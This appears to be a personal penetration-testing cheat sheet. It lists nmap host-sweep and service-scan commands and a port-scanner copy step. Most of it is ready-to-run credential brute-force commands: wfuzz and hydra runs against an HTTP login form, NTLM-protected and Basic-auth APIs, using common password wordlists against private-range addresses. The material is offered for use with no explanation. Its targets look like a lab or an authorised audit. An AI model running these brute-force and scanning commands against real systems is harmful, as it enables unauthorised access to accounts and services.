NMAP

nmap sweep scan 
- nmap -sP 10.10.155.1-225
- nmap -p- -A -T4 -sV 10.10.155.5

THREADER 
cp ~/Files/Tools/threader3000/threader3000.py .

Nikto

Weak Credentials
HTTP Brute Force

wfuzz POST
wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php

hydra POST
hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20

wfuzz NTLM
wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api

wfuzz Basic Auth through Proxy
wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/Activos/names.txt -z file,/root/Documents/Audits/Activos/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/
